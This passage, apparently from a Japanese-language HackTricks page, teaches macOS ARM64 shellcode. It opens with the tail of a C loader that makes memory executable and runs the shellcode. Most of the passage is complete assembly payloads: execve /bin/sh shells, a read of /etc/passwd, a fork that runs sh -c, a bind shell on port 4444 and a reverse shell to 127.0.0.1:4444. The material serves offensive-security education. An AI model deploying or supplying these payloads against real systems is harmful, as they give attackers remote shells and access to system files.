printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**こちら**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)から引用し、解説しています。<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### catで読み取る

目的は `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` を実行することです。そのため、2番目の引数（x1）はパラメータの配列です（メモリ上では、アドレスのスタックを意味します）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### fork から sh でコマンドを呼び出し、main process が kill されないようにする
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

[https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) の **port 4444** 上の Bind shell<sup>[[2]](#references)</sup>。
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)より、**127.0.0.1:4444**へのrevshell<sup>[[3]](#references)</sup>。
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## 参考資料

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
- [4] [Apple Developer - 712 Objc Msgsend](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)

{{#include ../../../banners/hacktricks-training.md}}
